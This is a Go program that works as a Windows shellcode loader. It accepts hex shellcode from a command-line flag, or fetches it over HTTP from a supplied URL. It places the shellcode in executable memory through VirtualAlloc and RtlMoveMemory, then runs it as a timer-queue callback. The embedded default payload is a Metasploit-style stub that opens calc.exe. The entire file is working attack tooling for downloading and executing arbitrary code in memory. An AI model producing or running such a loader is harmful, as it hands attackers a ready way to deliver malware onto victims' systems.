package main

import (
	"encoding/hex"
	"unsafe"
	"golang.org/x/sys/windows"
	"io/ioutil"
	"net/http"
	"os"
	"flag"
	"fmt"
	"log"
)


var (
	timer int
)

const (
	TRUE                   = 1
	FALSE                  = 0
)

var (
	kernel32              = windows.NewLazySystemDLL("kernel32.dll")
	ntdll                 = windows.NewLazySystemDLL("ntdll.dll")

	VirtualAlloc          = kernel32.NewProc("VirtualAlloc")
	CreateTimerQueue      = kernel32.NewProc("CreateTimerQueue")
	CreateEventW          = kernel32.NewProc("CreateEventW")
	WaitForSingleObject   = kernel32.NewProc("WaitForSingleObject")
	CreateTimerQueueTimer = kernel32.NewProc("CreateTimerQueueTimer")
	RtlMoveMemory         = ntdll.NewProc("RtlMoveMemory")
)

func main() {
	// Calc
	shellcodePath := flag.String("shellcode", "fc4883e4f0e8c0000000415141505251564831d265488b5260488b5218488b5220488b7250480fb74a4a4d31c94831c0ac3c617c022c2041c1c90d4101c1e2ed524151488b52208b423c4801d08b80880000004885c074674801d0508b4818448b40204901d0e35648ffc9418b34884801d64d31c94831c0ac41c1c90d4101c138e075f14c034c24084539d175d858448b40244901d066418b0c48448b401c4901d0418b04884801d0415841585e595a41584159415a4883ec204152ffe05841595a488b12e957ffffff5d48ba0100000000000000488d8d0101000041ba318b6f87ffd5bbf0b5a25641baa695bd9dffd54883c4283c067c0a80fbe07505bb4713726f6a00594189daffd563616c632e65786500", "Path to the shellcode file")
    shellcodeURL := flag.String("shellcode-url", "", "URL of the shellcode file")

	flag.Usage = func() {
		flag.PrintDefaults()
		os.Exit(0)
	}
	flag.Parse()
	var shellcodeHex string // Declare shellcodeHex outside if/else blocks
	var err error
	if *shellcodeURL == "" {
		// If not provided, check if the shellcode path is provided
		if *shellcodePath == "" {
			// If neither shellcode URL nor shellcode path is provided, exit with an error
			log.Fatal("Please provide either the URL or the path to the shellcode file")
		}
		shellcodeBytes := *shellcodePath
		
		_, err = hex.DecodeString(string(shellcodeBytes))
		if err == nil {
			// If decoding succeeds, it's in hexadecimal format
			shellcodeHex = shellcodeBytes
		} else {
			// If decoding fails, it's assumed to be in byte format
			shellcodeHex = hex.EncodeToString([]byte(shellcodeBytes))
		}
		
	} else {
		// Read from URL
		// Make HTTP GET request to fetch from URL
		resp, err := http.Get(*shellcodeURL)
		if err != nil {
			log.Fatalf("Error fetching shellcode from URL: %v", err)
		}
		defer resp.Body.Close()

		if resp.StatusCode != http.StatusOK {
			log.Fatalf("Failed to fetch shellcode from URL: %s", resp.Status)
		}

		shellcodeBytes, err := ioutil.ReadAll(resp.Body)
		if err != nil {
			log.Fatalf("Error reading shellcode from response body: %v", err)
		}

		// Check if shellcode is already in hexadecimal format
		_, err = hex.DecodeString(string(shellcodeBytes))
		if err == nil {
			// If decoding succeeds, it's in hexadecimal format
			shellcodeHex = string(shellcodeBytes)
		} else {
			// If decoding fails, it's assumed to be in byte format
			shellcodeHex = hex.EncodeToString(shellcodeBytes)
		}
	

		
	}
	
	
	shellcode, errShellcode := hex.DecodeString(shellcodeHex)
	if errShellcode != nil {
		log.Fatal(fmt.Sprintf("[!]there was an error decoding the string to a hex byte array: %s", errShellcode.Error()))
	}
	addr, _, _ := VirtualAlloc.Call( 0, uintptr( len( shellcode ) ), windows.MEM_COMMIT | windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE )

	RtlMoveMemory.Call( addr, ( uintptr )( unsafe.Pointer( &shellcode[0] ) ), uintptr( len( shellcode ) ) )
	
	queue, _, _ := CreateTimerQueue.Call()
	gDoneEvent, _, _ := CreateEventW.Call( 0, TRUE, FALSE, 0 )

	CreateTimerQueueTimer.Call( ( uintptr )( unsafe.Pointer( &timer ) ), queue, addr, 0, 100, 0, 0 )

	WaitForSingleObject.Call( gDoneEvent, windows.INFINITE )
}